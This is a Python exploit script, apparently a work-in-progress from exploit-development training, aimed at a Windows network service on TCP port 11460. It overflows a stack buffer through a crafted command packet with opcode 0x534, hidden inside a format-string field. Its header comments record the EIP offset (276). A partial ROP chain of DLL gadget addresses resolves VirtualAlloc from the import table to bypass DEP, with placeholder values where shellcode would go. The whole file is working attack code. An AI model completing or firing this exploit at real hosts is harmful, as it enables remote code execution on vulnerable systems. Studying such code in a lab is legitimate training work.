#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

# Results
# eip=41326a41
# pattern = 41 6a 32 41 = Aj2A
# $ msf-pattern_offset -q Aj2A -l 0x200
# [*] Exact match at offset 276

# eip offset: 276
# esp offset: 280

eip_offset = 276
command_buffer_length = 0x400

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
# These are dummy values for eventually calling VirtualAlloc.
va = pack("<L", 0x45454545)  # dummy VirutalAlloc Address
va += pack("<L", 0x46464646)  # Shellcode Return Address
va += pack("<L", 0x47474747)  # dummy Shellcode Address
va += pack("<L", 0x48484848)  # dummy dwSize
va += pack("<L", 0x49494949)  # dummy flAllocationType
va += pack("<L", 0x51515151)  # dummy flProtect

offset = b"\x90" * (276 - len(va))
# PART 1: Grab ESP.
# Move esp into eax.
eip = pack("<i", 0x50501110) # 0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret  ; -> mov esi, esp AKA Move the contents of esp into esi.
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn -> eax = esp
rop += pack("<L", (0x42424242)) # junk

# PART 2: Write the VirtualAlloc address.
# Subtract 0x1C from eax to get to VirtualAlloc address dummy placement.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Copy the location of VirtualAlloc dummy in eax back to esi
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret

# Pop the address of VirtualAlloc from the DLL's import table into eax, fixing bad characters.
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Grab the address to VirtualAlloc in Kernel32.dll.
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret

# Write the kernel32.dll address of VirtualAlloc to the dummy virtualalloc address on the stack.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

rop += b"C" * (command_buffer_length - eip_offset - 4 - len(rop))
payload = offset + va + eip + rop
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
buf += formatString

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()